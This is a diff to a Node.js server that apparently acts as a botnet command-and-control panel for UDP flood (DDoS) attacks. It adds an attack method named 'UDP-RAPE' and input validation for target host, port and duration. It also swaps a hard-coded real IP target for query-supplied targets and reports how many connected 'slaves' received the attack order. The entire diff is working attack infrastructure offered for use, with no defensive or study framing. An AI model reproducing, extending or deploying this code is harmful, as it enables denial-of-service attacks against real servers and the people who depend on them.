@@ -1,6 +1,7 @@
 const net = require("net")
 const express = require("express")
 const chalk = require("chalk")
+const Joi = require("joi")
 const chalkGradient = require("gradient-string")
 const chalkAnimation = require("chalk-animation")
 const terminalLink = require("terminal-link")
@@ -14,9 +15,23 @@ const SOCKET_HOST = "0.0.0.0"
  *  METHODS  *
  ************/
 
-const METHODS = ["OVH-UDP"]
+const METHODS = ["OVH-UDP", "UDP-RAPE"]
 
 var clients = []
+
+const validateAttack = (data = {}) => {
+    const schema = Joi.object({
+        host: Joi.string().min(4).required(),
+        port: Joi.number().min(0).required(),
+        time: Joi.number().min(1).positive().required(),
+        method: Joi.string()
+            .min(1)
+            .uppercase()
+            .valid(...METHODS)
+            .required(),
+    })
+    return schema.validate(data)
+}
 
 const sendAttack = (method, host, port, time) => {
     for (let client of clients) {
@@ -33,14 +48,17 @@ console.log(
 )
 
 app.get("/", (req, res) => {
-    let { method } = req.query
-    if (!method) return res.status(404).send("method parameter not set")
+    const { error } = validateAttack(req.query)
+    if (error) return res.status(400).send(error.details[0].message)
+    let { host, port, time, method } = req.query
     method = method.toUpperCase()
 
     if (!METHODS.includes(method))
         return res.status(404).send("method does not exist")
-    sendAttack(method, "141.95.52.208", 80, 10)
-    return res.send(`sent!`)
+    sendAttack(method, host, port, time)
+    return res.send(
+        `attack sent to ${server.connections}/${clients.length} slaves.`
+    )
 })
 
 var server = net.createServer(function (socket) {
